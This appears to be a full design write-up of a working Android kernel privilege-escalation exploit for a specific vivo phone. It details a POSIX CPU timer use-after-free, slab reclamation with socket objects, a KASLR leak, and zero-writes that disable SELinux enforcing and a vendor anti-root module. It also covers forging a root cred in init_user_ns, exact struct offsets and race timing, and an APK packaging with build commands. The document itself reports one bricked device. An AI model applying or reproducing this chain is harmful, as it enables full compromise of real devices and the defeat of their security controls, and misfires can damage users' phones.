# IC Timer LPE — Full Design and Implementation Approach

> Version: 0.10.6 (2026-11-01)
> Target: vivo PD2506 / V2506A, Android 16 (`16.1.15.0`), kernel
> `6.1.145-android14-11-gf506252fa70d`, SELinux Enforcing, adb shell identity
> `uid 2000 / u:r:shell:s0`, no kernel symbols, no root.
> End point: a real `uid=0` capability set within a single run, and handing
> root to a KernelSU-family manager (late load / jailbreak mode).

This document describes the full chain's **design rationale, why each step is
necessary, where the code lives, and how to read failure modes**. It is not
an API manual; for specific functions, `exploit/timer_lpe.c` is authoritative.

---

## 0. Executive Summary

- The exploit abuses a **k_itimer lifetime race in POSIX CPU timers**: when a
  non-leader thread calls `execve()`, the thread's CPU timers are freed, but
  the process's `posix_cputimers` base keeps a **stale rb_node** (cached
  leftmost) pointing at the freed `k_itimer`. After a later `timer_create()`
  reuses the same slot, that node can be "borrowed" into an arbitrary base and
  trigger `collect` / `rb_erase`.
- The attack has two layers:
  1. **Reclamation layer**: order-1 allocations (AF_UNIX 8K fragments or an
     IPv6 mcast source list) grab the freed `posix_timers_cache` slab page and
     turn it into a `kmalloc-256` object we can read and write;
  2. **Object layer**: inside that 256-byte object we forge `k_itimer` /
     `cpu_timer` / `cred`, and use one `collect` plus one `rb_erase` to swap
     the winning worker's `cred` pointer to a fake cred on that page, then
     have the worker fork/exec.
- Prerequisites: zero-permission **KASLR slide** (tracefs raw-caller voting),
  **vr.ko de-probing** (zero-write `__tracepoint_sys_exit->funcs`), and on
  stock devices a **SELinux `state-7`** zero-write (clears only enforcing,
  keeps initialized).
- End game: the fake cred's `user_ns` is swapped to the real `init_user_ns`,
  `uid` set to 0, and the fake `ucounts` ns/uid aligned, so the capabilities
  take real effect inside init_user_ns; the winner's worker forks a child that
  execs the payload, which finally runs the manager's
  `libksud.so late-load --allow-shell --package-name <pkg>` — the manager then
  reports **"jailbreak mode"**.
- Verified on two physical devices (ReSukiSU on slot D, 7kimisu on slot B);
  QEMU reproduced both ksu and shell end-to-end paths on the 16.1.15.0 kernel.

---

## 1. Goals and Environment

### 1.1 Device

| Item | Value |
|---|---|
| Model | vivo PD2506 / V2506A |
| OS | `PD2506B_A_16.1.15.0.W10`, `PD2506D_A_16.1.15.0.W10` (test units with different slots/batches) |
| Kernel | `6.1.145-android14-11-gf506252fa70d`, `#1 SMP PREEMPT` |
| Arch | aarch64, 8 cores |
| RAM | test units have 7.6 GB / 11.7 GB |
| SELinux | Enforcing (stock; the policy has no usable permissive domain) |
| Vendor module | `vr.ko`: `__tracepoint_sys_exit` callback that kills root tasks by task tag + euid/fsgid |
| KSU | manager installed (ReSukiSU / 7kimisu etc.), but no kernel-side KSU built in |

### 1.2 Starting point

- Launched as a Shizuku user service with the **shell identity**: `uid=2000`,
  `u:r:shell:s0`, `CapEff=0`, `CapBnd=0x8000c0`.
- `/proc/slabinfo` is readable (some vendor kernels allow it); `/sys/kernel/slab/...`,
  tracefs, and `/proc/kallsyms` are all unreadable (kptr_restrict / DAC / SELinux).

### 1.3 End point

- Within one run: `uid=0(root)`, with the fake cred's all-ones capability set
  in effect inside `init_user_ns`; able to `finit_module` / write `/data/adb`.
- Hand off to a KSU manager: `late-load --allow-shell`, and the manager UI
  reports "jailbreak mode".

---

## 2. Constraints and Adversary Model

The design must satisfy all of the following simultaneously (each one maps to
a pitfall in the implementation):

1. **KASLR**: `/proc/kallsyms` unreadable; the slide must be derived from raw
   tracefs addresses.
2. **SELinux**: the stock policy has no permissive domain; a `ksu` domain only
   exists on user-built devices. So on stock devices `enforcing` must be
   cleared temporarily (without clearing `initialized`).
3. **vr.ko**: once the fake cred has euid=0, the task's first `sys_exit` gets
   it killed by the vendor module. Its tracepoint `funcs` must be zeroed
   before the winner is released.
4. **No userspace-exploitable kernel mappings**: the shell domain cannot
   create io_uring, read tracefs, or read `/sys/kernel/slab/*`; the reclamation
   layer can only use order-1 allocations that are **creatable, editable
   in place, and readable back** — AF_UNIX 8K fragments (unixstr) and IPv6
   `MCAST_MSFILTER` psls.
5. **RLIMIT_SIGPENDING**: uid 2000's soft/hard limits are 44195 or 28179 on
   the test units; every spray/fill must work inside that budget and give it
   back.
6. **No write access to `/data/adb`**: shell cannot write it; only the fake
   cred + real capabilities can. So the drop directory and payload must be
   prepared before escalation.
7. **panic_on_oops / panic_on_warn**: no miss may cause a kernel oops; every
   "uncertain" path must park instead of exiting.
8. **Vendor kernel**: vivo's 6.1.145 is not stock GKI; KSU's LKM needs extra
   adaptation (vermagic / unexported symbols) — the practical boundary of the
   final handoff.

---

## 3. The Bug: A Stale rb_node in POSIX CPU Timers

### 3.1 The memory shape of k_itimer

- `struct k_itimer` is **264 bytes (0x108)**, in `posix_timers_cache`, one
  slab per 2 pages (order-1, 0x2000), **31 objects**.
- Object k starts at `S + 0x108·k`; its `cpu_timer.node` (rb_node) starts at
  `X = S + 0x108·k + 0x78`.
- Key fields (relative to X):

| Offset | Field |
|---|---|
| +0x00 / +0x08 / +0x10 | `rb_parent_color` / `rb_right` / `rb_left` |
| +0x18 | `expires` |
| +0x20 | `ctmr->head` (timerqueue_head pointer) |
| +0x28 | `ctmr->pid` |
| +0x30 / +0x38 | `elist.next` / `elist.prev` |
| +0x40 | `firing` |
| +0x48 | `handling` (task pointer written by collect) |
| -0x24 | `it_sigev_notify` |
| -0x58 | `it_lock` |

- After page alignment: `X & ~0x1fff = S` (the 0x2000 slab base),
  `L = X & 0xff`, `O = (X - S) >> 8`. L and O are both determined by the same
  k; only **k=0..6** give `L ∈ {0x78,0x80,…,0xa8}` with `O=0..6`; the
  remaining 24 positions push fields across the 0x100 psl object boundary or
  outside the psl window and are **unusable** (see `block_fits` in §8.1).

### 3.2 The exec/exit race

What `ic_run_target()` does (from `timer_lpe.c:1813`):

1. Set up a fragmented VMA region of 16K pages (`ic_prepare_fragmented_range`);
2. Start 3 `CLONE_VM` "locker" threads and 1 killer;
3. Start a `timer-exec` thread that does `timer_create(SIGEV_SIGNAL)` on **its
   own `CLOCK_THREAD_CPUTIME_ID`** and arms it for 3600 seconds;
4. The `timer-exec` thread spins and then calls `execve("/proc/self/exe")`;
5. The killer polls `tgkill(tgid, exec_tid, 0)` until it returns `ESRCH`
   (the exec thread has been wiped by de_thread), then `SIGKILL`s the
   process group.

A non-leader thread's exec forces the kernel through `de_thread()`: the thread
group becomes single-threaded, and the exec thread's per-thread resources
(including its CPU timer references) are freed on the exit path. But the
process's `posix_cputimers.bases[]` cached `rb_leftmost` still points at that
`k_itimer`'s node address. The killer guarantees the whole victim process
dies inside the correct window, so:

- **A's timer object is freed** (`call_rcu` → `kmem_cache_free`);
- A's base keeps the stale rb_node pointing at it.

### 3.3 The slot-reuse chain

1. Padding tunes X's slab to "exactly some free, rest full" and positions the
   LIFO head of the next `timer_create` exactly at X;
2. **A** forks, creates its own CPU timer → occupies X;
3. A dies (§3.2), X is freed → returns to the head of CPU0's freelist;
4. **B** forks, creates a timer → reuses X;
5. B dies, X returns to the freelist head again;
6. **candidate 0** (worker 0's clockid) does `timer_create` → reuses X,
   armed for 3600 seconds;
7. **reap A**: `cleanup_timerqueue()` walks A's base;
   `timerqueue_getnext` still returns X; after `timerqueue_del` it sets
   `ctmr->head = NULL` — and that is exactly candidate 0's `head` field;
8. **delete candidates**: candidate 0's `head` is already NULL, so
   `cpu_timer_dequeue()` returns immediately and does **not** remove it from
   worker 0's base. Worker 0's base points at X forever.
9. The subsequent spray grabs X's slab page as `kmalloc-256`; X's bytes are
   fully under our control, and worker 0's next tick `collect`s according to
   the tree we wrote.

### 3.4 Why two victims, A and B

- A provides the "first free + stale leftmost";
- B ensures the slot is reallocated (LIFO) before the candidate, and its exit
  pushes X back to the head of the freelist;
- A's reap must happen after the candidate has occupied X, so that the
  candidate's `head` gets cleared — the pivotal transfer of the whole
  "tree borrowing".

---

## 4. Primitive 1: Zero-Permission KASLR Slide

`ic-timer slide` (the slide mode of `timer_lpe.c`):

- Read the text of `sched_blocked_reason`, `caller=NAME+0xoff/`, to get
  **link-time names + within-page offsets**;
- Read **raw kernel addresses** from tracefs per-CPU `trace_pipe_raw` (the
  sampling window tracefs leaves readable for shell);
- For each `(name, raw)` pair compute `slide = raw - (link_name + off)`;
- Filter: 2 MB aligned, < 512 GB, at least 2 distinct anchors, votes ≥
  `IC_SLIDE_MIN_VOTES` (default 4; weak votes rejected);
- Using the 66-entry built-in link-time symbol table, output:

```
SLIDE=0x…
FUNCS=0x…            __tracepoint_sys_exit
SELINUX_STATE=0x…    selinux_state
INIT_USER_NS=0x…     init_user_ns
INIT_CRED=0x…        init_cred
```

- `uname -r` must exactly match `6.1.145-android14-11-gf506252fa70d`, otherwise
  it refuses outright: never write memory on an unknown kernel.
- QEMU (KASLR on) verification: the slide matches what root sees in
  `/proc/kallsyms` byte for byte; QEMU enables KASLR by default, so local
  testing needs `nokaslr` to use link-time addresses.

---

## 5. Primitive 2: Slab Page Reclamation

The freed `posix_timers_cache` slab is **order-1 (2 pages)**. To turn it into
a readable/writable object from the shell domain, we must use allocations of
the same order-1:

### 5.1 unixstr (AF_UNIX 8K fragments)

- 256 socket pairs, each sending 8192 messages of 8K fragments;
- The fragment objects are `kmalloc-256` on order-1 slabs;
- Via `MSG_PEEK` / receive-side readback, we can scan for raw pointers of
  stale timer nodes appearing inside them (`[unixstr] LEAK`);
- Used for the **zero-write** stage (de-probing, SELinux), because its window
  is shorter and lighter.

### 5.2 IPv6 mcast psl (the carrier for the D2 chain)

- `setsockopt(IPPROTO_IPV6, MCAST_MSFILTER)` creates a
  `struct ip6_sf_socklist`: `kmalloc-256`, order-1, a 0x18-byte header
  (`sl_max@0`, `sl_count@4`, `rcu@8`) followed by 14 16-byte source slots
  `[0x18,0xf8)`;
- 600 sockets × 64 groups = 38464 objects;
- **In-place editing** uses only `MCAST_BLOCK_SOURCE(43)` /
  `MCAST_UNBLOCK_SOURCE(44)` (EXCLUDE mode), keeping `sl_max` unchanged;
  deletes shift left by value, freed slots are not erased;
- `getsockopt(MCAST_MSFILTER)` reads all 14 slots back verbatim → this is our
  "read/write kernel memory" interface;
- Never call `MCAST_MSFILTER` again after spraying (it reallocs, moves the
  object, and rewrites `sfmode`); never let `sl_count` drop to the point of
  triggering `ipv6_sock_mc_drop`.

> Why not io_uring / AIO: the shell domain cannot create io_uring (anon_inode
> create is DENIED), and AIO's ring pages are order-0 — they cannot capture
> a discarded order-1 slab.

---

## 6. Primitive 3: Zero-Write

The `ic_unxstr` zero-write path (`IC_ZERO_TARGET`):

- Uses a stolen slab page to forge an `rb_node` so that `rb_erase` executes
  `*(target) = 0` during its epilogue;
- Writes only **8 zero bytes**, no readback, no content verification (the
  caller verifies);
- On success the process parks (its base still points at the rewritten page;
  exiting would walk a bad node).

Uses:

1. **vr.ko de-probing**: `__tracepoint_sys_exit->funcs` sits at tracepoint
   struct +0x40; after the zero-write, `trace_sys_exit()`'s `funcs` is NULL,
   the event loop skips the callback, and `vr.ko` no longer kills root tasks.
2. **SELinux**: `selinux_state` layout `enforcing@+0`, `checkreqprot@+1`,
   `initialized@+2` (bit16). A single 8-byte zero-write must land at
   **`state - 7`**, window `[state-7, state]`, clearing only `enforcing`.
   Hitting `state+0` would clear `initialized` too, entering "uninitialized"
   rather than permissive: new inodes get no labels and `/data` becomes
   unlabeled — this was the cause of the 2026-10-29 incident (a user's device
   had to go in for repair). After writing, the gate must pass:
   `getenforce` = Permissive **and** `policyvers` readable; if unreadable,
   reboot immediately.

---

## 7. Primitive 4: Fake cred with a Real user_ns

The fake cred lives entirely inside the stolen psl page (layout from
`lay12.py`):

| cred offset | field | source |
|---|---|---|
| 0x00 | `usage\|uid` | one slab relocation (usage=low 32 bits, uid=high 32 bits) |
| 0x14 | euid=0 | literal |
| 0x18 | egid=0 | literal |
| 0x1c | fsuid=0xffffffff | makes the second collect's expires decode hold |
| 0x28..0x48 | cap_inheritable/permitted/effective/bset/ambient | all 1s / 0s |
| 0x78 | security (tsec) | points at 0x18 bytes inside block O |
| 0x80 | user | in-page fake `user_struct` |
| 0x88 | user_ns | in-page fake `user_namespace` by default; **patched when the real userns is used** |
| 0x90 | ucounts | in-page fake `ucounts` |
| 0x98 | group_info | in-page fake `group_info` |

### 7.1 Why the real `init_user_ns` matters

- The default fake `user_namespace` has a huge `level`; `cap_capable()` on the
  `init_user_ns` side rejects it immediately: the fake caps are only valid
  inside the private userns and do nothing for `init_user_ns` DAC/module
  loading.
- After swapping `cred->user_ns` to the real `init_user_ns`,
  `cap_capable()` sees `cred->user_ns == &init_user_ns`, the `cap_effective`
  set is genuinely honored, and `CAP_SYS_MODULE` / `CAP_SETUID` /
  `CAP_DAC_OVERRIDE` all take effect.
- Three more things are required (since 0.10.3):
  1. `cred->uid = 0`: otherwise `getuid()` returns the high 32 bits of the
     address (`0xffffff80`), the helper calls `setresuid(0,0,0)`, and
     `commit_creds()` decrements the fake `ucounts` (rlimit=0) →
     `ucount.c:285 WARN`; devices with `panic_on_warn=1` reboot here.
  2. Fake `ucounts->ns = init_user_ns` and `ucounts->uid = 0`: this makes
     `set_cred_ucounts()`'s early return
     (`ucounts->ns == user_ns && ucounts->uid == cred->uid`) hold, so it
     never `alloc_ucounts()`s a real ucounts with rlimit=0.
  3. These pokes apply only to the **base pattern**, never to s1/s2
     (see §8.3).

### 7.2 A real pitfall: the userns patch must not hit s1/s2

0.10.1 wrote `init_user_ns` at `(cred+0x88)&0xff = 0xa0` into base/s1/s2 at
the same time. Base was correct (the fake cred sits in block 0/1); but s1/s2
are the **block O** timer-node mirror, and for the classic geometry 0xa0 is
a live field:

| L | Overwritten field | Consequence |
|---|---|---|
| 0x78 | `ctmr->pid` | collect never reads it; mostly harmless |
| 0x80 | `ctmr->head` | `cpu_timer_dequeue()` rb_erases with `init_user_ns` as head — corrupts globals |
| 0x88 | `expires` | becomes a huge kernel address → never expires → `stage1 no winner` |
| 0x90 / 0x98 / 0xa0 | `rb_left` / `rb_right` / `rb_parent_color` | wild pointer writes, panic risk |
| 0xa8 | `sigq` | SIGEV_NONE mostly never uses it |
| 0x40 | union hole | harmlessly irrelevant |

**Rule: the real-userns poke only ever hits base.**

---

## 8. The mcast D2 Chain

### 8.1 Geometry and the case table

- `X = S + 0x108·k + 0x78`, `L = X & 0xff`, `O = (X-S)>>8`;
- Of the 31 k values, only `L ∈ {0x78,…,0xa8}` (k=0..6) both keeps every
  field inside **the same 0x100-byte psl object** and keeps the 14 source
  slots of the release rewrite unique — a **7/31 ≈ 22.6%** chance of hitting
  a usable geometry;
- **`block_fits` constraint**: every field must satisfy `L+off ≥ 0` and
  `L+off+size ≤ 0x100`. For L=0x40 (k=25), `it_lock` at `L-0x58=-0x18` lands
  in the adjacent psl object; s1's lock word gets written where the kernel
  doesn't read it → stage1 always fails; this case was deleted from the table
  (the 0.10.2 lesson);
- The remaining L values (0x18..0x68) are mostly unusable due to `sigev`
  crossing the boundary or source slots that cannot be made unique.

The case table (`exploit/mcast_pats.h`, generated by
`model/gen_mcast_tables.py` from `model/mcastrel4.py` + `model/lay12.py`)
contains, per case:

- `oi` (O), `l` (L), `r0 = L-0x58`, `c_lock`, `sec`, `scratch`, `cred_off`;
- **base / s1 / s2 — three 14×16-byte patterns**; each 16-byte slot is one
  IPv6 source address, with 8-byte fields encoded as kind=1 (slab-relative)
  or kind=2 (winner-relative) relocations.

`model/verify_tables.py` expands the generated C table and compares it
byte-for-byte against the model, and checks `block_fits`;
`gen_mcast_tables.py` skips any L that crosses a boundary.

### 8.2 Carrier and edit semantics

- One psl object is 256 bytes = one block; `sl_count` only bounds the search
  range — the bytes inside the slots are physical memory;
- Write = first delete the 14 sources by value, then append 14 new sources
  (order from tail down to c_lock, then head up to 0; the final append
  atomically changes the lock word to 0);
- Readback = `getsockopt` fetches the 14 16-byte slots; 8-byte fields are
  resolved by residue.

### 8.3 base / s1 / s2

**base** (written to all blocks matching the winning ordinal ±40, except
block O):

- The fake cred's full field set (including the fake
  user/ns/ucounts/gi/security pointers);
- The fake cred always sits in **block 0 (cred_off=0x18)** or **block 1
  (0x118)**, so it can never overlap block O's timer node;
- With the real userns, base gets four pokes: `user_ns` (res 0xa0), `uid`
  (0x1c), `ucounts->ns` (0xc8), `ucounts->uid` (0xd0); lay12 verifies that
  those four residues hit only the target object across all 7 cases.

**s1** (written to the block matching ordinal n = block O):

- Fake timer node: `q0=scratch`, `q1=0`, `q2=X+0x18` (rb_left points at
  expires), `q3=expires=1`, `q4=fake_head=C-0x10`, `q5=pid=1`;
- `elist` self-referencing, `firing=1`, `handling=0`, `sigev=SIGEV_NONE`,
  `it_lock=1`;
- Kernel collect will: `handling=current` → dequeue through the fake head
  (leaving the real base untouched) → `list_add_tail(elist)` →
  `spin_lock(it_lock)` parks forever (the lock word is 1).

**s2** (also written to block O, for the release rewrite):

- `q0=C` (the fake cred address), `q2=winner+0x838` (winner->cred),
  `q4=winner+0x7c8` (the real head), `q5=~0`, `it_lock=0`;
- The 14 source slots are written in the delete/append order of §8.4; the
  lock word atomically becomes 0 when the append reaches `c_lock`, and the
  parked winner resumes immediately;
- The next collect dequeues against the **real head**; `rb_erase` writes
  `C = slab+cred_off` into `winner->cred`, and writes that field's address
  into `C+0x08` (the cred's gid|suid — later repaired by the release logic).

### 8.4 Full-chain timing (`ic_peak_attempt` + `ic_mc_chain`)

```
1. slide / prerequisite zero-writes (vr funcs, selinux state-7)
2. setup: 16 workers, vma prewarm, filp/km64 shield
3. slab padding + align (IC_PAD_ALIGN=1, IC_PAD_KEEP=4185)
   — leave X's slab with exactly 16 free slots, all other slabs full
4. chain base = num_objs (slabinfo)
5. victim A fork → timer → exec-race death → A zombie
   (fixed 3 s grace waiting for the call_rcu free)
6. victim B fork → reuses A's slot → dies → B zombie
   (another 3 s grace)
7. candidates 0..15 created and armed (candidate 0 reuses X)
8. chain A/B/C count gates: d_a/d_b/d_c must all be 0, else park
9. reap A: cleanup_timerqueue clears candidate 0's head
10. delete candidates: X stays in worker 0's base
11. flush timers (496) → drain: SKBF_MIN=8 releases only a few order-2
    datagrams to drain the pcp lists; the remaining datagrams flush only
    after the fill
12. psl spray: 38464 objects; watch slabinfo for the posix count dropping
    ("drop at objs=N"); safe fill 4000 + late fill 2000
13. IF no drop seen → "spray never saw X's discard" → park
14. reap B: the stale node is now inside a psl page
15. LEAK: scan the psl readback for the stale node address x;
    compute L=x&0xff, O=(x-S)>>8;
16. no case → park; supported geometry → case table
17. base written to ±40 blocks (including the real-userns pokes)
18. s1 written to block O → trigger settime(0) → collect → handling=current
    (if not collected: re-fire every 100 rounds; 2000-round cap)
19. stage2: read back T1 → s2 rewrite + delete/append the release lock word
    → next collect dequeues against the real head → winner->cred = C
20. winner worker detects getuid() (w0 uses the fake sentinel, other workers
    use uid != real_uid) → sid scan/ctxmap → fork child → exec payload
```

### 8.5 Safety gates (why "failure doesn't crash")

1. **A/B/C count gates**: proceed only if `num_objs` is unchanged before and
   after each of the three `timer_create`s; any new slab (a multiple of 31)
   means the slot is not X — park instead of reaping A.
2. **spray drop gate**: if slabinfo shows no drop in the posix count during
   the spray → "spray never saw X's discard" → park.
3. **no-case gate**: L not in the table (or block_fits violated) → park;
   before s1, never write a nonzero pattern — the all-zero psl state can be
   abandoned at any time.
4. **park policy**: after the leak (`g_mc.leak`) always park; if
   `g_peak_doomed` and `panic_on_warn` is unreadable/nonzero, also park;
   parking returns the fill/pool sigqueue quota and sends `R` to the
   supervisor, whose parent forks the next attempt.
5. **stage1 timeout diagnostics**: prints `handle=/elist=/cnt=`:
   - `handle=0 && elist==X+0x30` → collect never ran (candidate may not
     have landed on X's slot, or the base no longer points at X);
   - `handle!=0` → collect ran but readback/pointer checks failed.
6. **panic_on_warn / panic_on_oops**: every "might have to exit" path parks;
   the target device has panic_on_oops=1 — any oops reboots it.

### 8.6 The release rewrite (no third victim needed)

`ic_mc_replace_parked()`:

- First reads back T1 (the post-collect mirror), requiring all 14 slots to
  be pairwise distinct;
- Lock word at `r0 = L-0x58`, `c_lock = chunk_of(r0)`;
- **Tail deletes**: from count-1 down to c_lock; **head deletes**: then down
  to 0. Head deletes only write 0..count-2, so the lock slot never moves;
- **Appends**: in order 0..13; the `c_lock+1`-th append lands on the lock
  slot; both 8-byte halves of the 16-byte store contain the full 4-byte lock
  word, so the 1 → 0 transition is atomic;
- Once the winner is released, the next tick's collect completes the erase
  using s2's real head and writes C into `winner->cred`.

---

## 9. End Game: From Winner to Root

### 9.1 Winner detection

- collect writes `handling = current` into the psl; the main thread polls
  `handling`, and a kernel pointer there identifies the winner;
- Worker side: w0 uses `g_peak_fake_uid` (`cred>>32`) directly instead of
  calling `getuid()` (avoiding stepping into the forged user_ns on the first
  call); other workers call `getuid()`, and `uid != real_uid` or `== fake`
  marks them as winners too;
- On success they climb the `g_scan_phase` ladder: 1 leave the uid check →
  2 getpid → 3 scan → 4 psl round-trip → 5 child collected.

### 9.2 sid scan / ctxmap

- `IC_INTERN_SELF=1`: uses the rejected `/proc/self/attr/exec` to intern the
  target context (on stock devices `u:r:shell:s0`) into the sidtab;
- The winner rewrites the fake tsec's `sid` in place via the psl
  BLOCK/UNBLOCK for each candidate sid, forks a child that execs the
  payload;
- The child acks over the inherited pipe; `[ctxmap] u:r:shell:s0 = sid N`
  marks the hit; measured on real devices shell:s0 is **sid 2511 (slot D) /
  2604 (slot B)**, not the QEMU policy's 52 — the scan walks up to the
  sidtab_entries bound.

### 9.3 drop / exec

- `IC_PREP_DROP=1` pre-creates `/data/local/tmp/ic-dropdir` (0777) and copies
  the payload (the 2.7 MB exploit itself) into it while still holding the real
  shell identity;
- The winner's forked child inherits the fake cred (euid/uid=0, real caps);
  after the sid rewrite it execs `/data/local/tmp/ic-dropdir/payload`;
- The payload's `IC_PAYLOAD_CMD` is the device-side proof command:
  `id; cat /proc/self/attr/current; getenforce; echo LPE-PROOF`.

### 9.4 KSU handoff

- The payload runs the KSU manager APK's `libksud.so` as `uid=0`:
  ```
  ksud late-load --allow-shell --package-name <pkg> [--kmi <kmi>]
  ```
- Manager auto-detection order: KernelSU, SukiSU Ultra, BakaSU, ReSukiSU,
  SakiSU, 7kimisu (`com.sevenk.core` / `com.sevenkimimasy.love`);
- Measured on real devices: a successful `late-load` may produce **no output
  at all with rc=0**; the module name also differs per fork
  (`kernelsu`/`ksu`/`sukisu`) and may load **asynchronously**; the manager
  then shows **"jailbreak mode"**;
- 0.10.6 verification: after each late-load, poll `/proc/modules` for ≤20 s
  matching `ksu|kernelsu|suki`; su via `command -v su` +
  `/data/adb/ksu/bin/su` etc.; run `ksud install` while the module is
  present; report OK only if module + `su -c id` both hold, otherwise
  PARTIAL/UNCONFIRMED with the hint "if the manager shows jailbreak mode,
  it is done".

---

## 10. Engineering

### 10.1 APK (`apk/`)

- Package name `dev.ic.timerlpe`; the plain app is only a shell — execution
  happens in the Shizuku user service `IcService`; **Shizuku must be started
  with the shell identity** (ADB/wireless debugging).
- Each run pushes new file names (`ic-timer-a<stamp>`, `ic-lpe-a<stamp>.sh`)
  to avoid truncating an ELF still being executed by an earlier parked
  attempt.
- Dual log writes: `/data/local/tmp/ic-app-a<stamp>.log` and
  `/sdcard/Download/ic-app-a<stamp>.log`.
- `MainActivity`: KSU manager spinner, 16 attempts, diagnostics button;
  since 0.10.2 the "de-probe" toggle is gone (with vr.ko present it is
  mandatory).

### 10.2 `run_lpe.sh` (`apk/assets/`, the orchestrator)

```
[1/3] ic-timer slide
[2/3] vr.ko present → zero-write funcs; stock → zero-write selinux_state-7
[3/3] mcast chain (16 attempts, IC_REAL_INIT_USER_NS, ctxmap=shell:s0)
```

- `zero_attempt()`: runs the zero-write in the background; success is judged
  by `[zero] target=`; failure only on `no root after` or process exit
  (since 0.10.4, a first `no leak` no longer aborts); `ZERO_ATTEMPTS`
  defaults to 6.
- Every successful zero-write parks its process (it holds a rewritten base);
  it must never be kill -9'd.

### 10.3 Build

- Payload (NDK r27c):
  ```
  aarch64-linux-android24-clang -O2 -g -static -D_GNU_SOURCE \
      -fno-emulated-tls -o exploit.device timer_lpe.c
  ```
  `-fno-emulated-tls` is mandatory; without it TLS alignment drops to 8 and
  the static startup crashes immediately.
- APK: `apk/build.sh` (aapt2/aidl/d8/zipalign/apksigner, offline;
  versionCode/versionName kept in sync between the script and the manifest).
- QEMU harness: `harness/reap_init_sb.c` built as init with zig; the initrd
  carries `init`, `exploit`, `policy.bin`; `run_shellboot.sh` boots
  `qemu-system-aarch64`, forwarding `ic_*` parameters on the cmdline.
  Key: QEMU needs `nokaslr`, otherwise the link-time addresses passed to
  `ic_real_init_user_ns` are all wrong.

### 10.4 Version and artifacts (0.10.6)

| Artifact | Value |
|---|---|
| payload `assets/ic-timer` | 2,778,760 B, sha256 `3633ED0F4394AA2D4F95CCED4E4AD299D857456387AADF783917164CEB7C4855` |
| APK | 1,184,333 B, sha256 `58BC83BE5E8C7E61C57DB8237CC6EBEFC35FE4AA3AF719360297A32CD5903018` |
| versionCode/Name | 22 / 0.10.6 |

---

## 11. Real-Device and QEMU Validation

### 11.1 QEMU (16.1.15.0 kernel + device policy)

- `ct83_0102_uid0.log` (ksu ctxmap): attempt 0, `L=0xa8/O=6` →
  `stage1 parked` → `stage2 erased` → `[ctxmap] u:r:ksu:s0 = sid 56` →
  `[helper] euid=0 uid=0` → `[peak] SUCCESS`, 0 WARNINGs.
- `ct84_uid0_shell.log` (shell ctxmap = the stock end path):
  `[ctxmap] u:r:shell:s0 = sid 52` → `[helper] euid=0 uid=0` →
  `[drop]` → SUCCESS, 0 WARNINGs.
- Failure case: `ct80` had KASLR on and the harness did not forward
  `IC_LATE_FILL`; attempt 5 panicked on a miss (`rb_next`/
  `dead000000000122`) — a test-configuration issue, not a 0.10.x
  regression.

### 11.2 Real devices

| Unit | Manager | Hit | shell sid | Result |
|---|---|---|---|---|
| Slot D 7.6 GB | ReSukiSU | `L=0x80/O=1` (attempt 3) | 2511 | `uid=0(root)`, `LPE-PROOF`, manager in jailbreak mode |
| Slot B 11.7 GB | 7kimisu | `L=0x78/O=0` (attempt 5) | 2604 | same |

- Both units: two successful zero-writes → several mcast `no case` parks →
  hit a usable geometry → `stage1/stage2` → ctxmap → helper uid 0 → drop →
  KSU late-load.
- Probability reference: 7/31 geometry × ~50% capture ≈ 11% per attempt;
  16 attempts hit at least one usable geometry with ~85% probability.

---

## 12. Failure-Mode Quick Reference

| Log | Meaning | Action |
|---|---|---|
| `[peak] chain broke` | num_objs changed between A/B/C; X's slot is not the candidate's | park, retry |
| `[peak] spray never saw X's discard` | posix count didn't drop during the spray; page not captured | park, retry |
| `[mcast] L=0x..: no case` | geometry unsupported (or block_fits violated) | park |
| `[mcast] no leak` | spray/scan found no stale node | safe park |
| `[mcast] stage1 no winner handle=0 elist=X+0x30` | collect never ran: base doesn't point at X (placement miss) | park |
| `[mcast] stage1 no winner handle=0x...` | collect ran but the winner couldn't be read | record; check pointers/layout |
| `[peak] stage1 refire` | first trigger lost, re-firing | normal |
| `[mcast] real user_ns patch ...` | real userns/uid/ucounts pokes | normal |
| `[ctxmap] target not found up to N` | scan finished without finding the target context | check IC_SCAN_MAX/policy |
| `[ksu] handoff PARTIAL/UNCONFIRMED` | module/su unverified | check dmesg; the manager's jailbreak mode is authoritative |
| `[auto] zero ... failed` | zero-write supervisor exhausted/timeout | reboot and retry; check `zero-*.log` |
| Kernel panic (`rb_erase`/`rb_next`) | miss family; page not caught | reboot; device has panic_on_oops=1 |

---

## 13. Known Limitations and Future Work

1. **Geometry 7/31**: limited by the 0x100 psl object field window; more
   geometries need a new carrier (different object size) or a new release
   mechanism.
2. **Capture rate**: ~50% per attempt on real devices; affected by padding
   alignment, pcp state, and vendor RSC allocation routing.
3. **Silent slot mismatch**: the A/B/C count gates can only see "the slab
   changed", not "same slab, different slot"; stage1's `handle=` diagnostics
   are the only observation channel.
4. **panic_on_warn / SigQ**: on small-SigQ units (28179) the fill is
   truncated, raising the panic risk on a miss; lower `IC_PAD_KEEP`/pool per
   unit if needed.
5. **Vendor KSU LKM**: the stock vivo kernel has no built-in KSU; a
   `late-load` module on the vivo kernel may produce empty output with rc=0
   while actually taking effect asynchronously (both real devices behaved
   this way; the managers showed jailbreak mode). If a given unit's module
   truly fails to load, that kernel needs its own patched `kernelsu.ko`
   (vermagic + absolute-izing unexported symbols).
6. **Weird gid display**: the stage-2 erase damages the fake cred's gid
   field, so `id` shows `gid=496546360`; display-only — uid 0/caps are
   unaffected. If needed, the helper can `setresgid(0)/setgroups(0)` first.
7. **One-shot**: all parked processes, psl sockets, and fake creds vanish
   on reboot; reboot before every full run.

---

## 14. Kernel Code Walkthrough (6.1.145, `k61tim/posix-cpu-timers.c`)

This section maps the conclusions of §3/§8 to concrete kernel functions, to
double-check "why this window exists".

### 14.1 Exit cleanup: `cleanup_timerqueue`

```c
static void cleanup_timerqueue(struct timerqueue_head *head)
{
    struct timerqueue_node *node;
    struct cpu_timer *ctmr;

    while ((node = timerqueue_getnext(head))) {
        timerqueue_del(head, node);
        ctmr = container_of(node, struct cpu_timer, node);
        ctmr->head = NULL;              /* ← this step is the chain's pivotal transfer */
    }
}

void posix_cpu_timers_exit(struct task_struct *tsk)
{
    cleanup_timers(&tsk->posix_cputimers);
}

void posix_cpu_timers_exit_group(struct task_struct *tsk)
{
    cleanup_timers(&tsk->signal->posix_cputimers);
}
```

- `timerqueue_getnext(head)` returns **`rb_root_cached.rb_leftmost`** — not a
  tree walk; even if the node was freed long ago, as long as `rb_leftmost`
  still points at that address, it is treated as a node here.
- `cleanup_timerqueue` does two things per fetched node: `timerqueue_del`
  (using the current head's tree) and `ctmr->head = NULL`. The second one
  writes the field at **node address + 0x20** — i.e. candidate 0's
  `ctmr->head`.
